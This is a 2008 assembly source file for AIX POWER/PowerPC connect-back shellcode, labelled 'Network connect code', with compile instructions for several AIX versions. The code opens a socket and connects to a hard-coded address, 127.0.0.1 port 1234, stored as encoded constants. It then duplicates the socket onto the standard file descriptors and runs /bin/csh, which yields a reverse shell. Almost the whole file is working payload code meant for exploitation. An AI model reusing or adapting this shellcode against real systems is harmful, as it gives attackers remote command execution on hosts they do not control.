/*
 *  $Id: aix-power-cntsockcode.S 6 2008-09-10 17:27:50Z ramon $
 *
 *  aix-power-cntsockcode.S - AIX POWER/PowerPC Network connect code
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -DVERSION -o aix-power-cntsockcode aix-power-cntsockcode.S
 *
 * Where VERSION is one of the currently supported AIX versions.
 * -DV41    AIX 4.1
 * -DV42    AIX 4.2
 * -DV43    AIX 4.3
 * -DV4330  AIX 4.3.3.0
 * -DV53    AIX 5.3
 *
 */

#include "aix-power.h"

    .globl .main
    .csect .text[PR]

.main:

syscallcode:
    # xor.    %r31,%r31,%r31
    xor.    %r5,%r5,%r5
    bnel    syscallcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r30,-475(%r30)
    mtctr   %r30
    bctr
    .long   0xff0204d2
    .long   0x7f000001
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02
    cal     %r30,-8(%r30)

cntsockcode:

    # socket

    lil     %r29,__CAL

    # xor     %r5,%r5,%r5
    cal     %r4,-510(%r29)
    cal     %r3,-509(%r29)
    cal     %r2,__NC_socket(%r29)
    mtctr   %r30
    bctrl
    mr      %r28,%r3

    # connect

    cal     %r5,-495(%r29)
    cal     %r4,-8(%r30)
    cal     %r2,__NC_connect(%r29)
    mtctr   %r30
    bctrl

    # close

    cal     %r27,-509(%r29)

0:
    mr      %r3,%r27
    cal     %r2,__NC_close(%r29)
    mtctr   %r30
    bctrl

    # kfcntl

    mr      %r5,%r27
    xor     %r4,%r4,%r4
    mr      %r3,%r28
    cal     %r2,__NC_kfcntl(%r29)
    mtctr   %r30
    bctrl

    ai.     %r27,%r27,-1
    bge     0b

shellcode:
    # lil     %r31,__CAL

    xor.    %r5,%r5,%r5
    bnel    shellcode

    # mflr    %r30
    # cal     %r30,511(%r30)
    # cal     %r3,-475(%r30)
    mflr    %r26
    cal     %r26,511(%r26)
    cal     %r3,-475(%r26)

    stu     %r5,-4(%r1)
    stu     %r3,-4(%r1)
    mr      %r4,%r1

    # cal     %r2,__NC_execve(%r31)
    cal     %r2,__NC_execve(%r29)

    mtctr   %r30
    bctr
    .asciz  "/bin/csh"

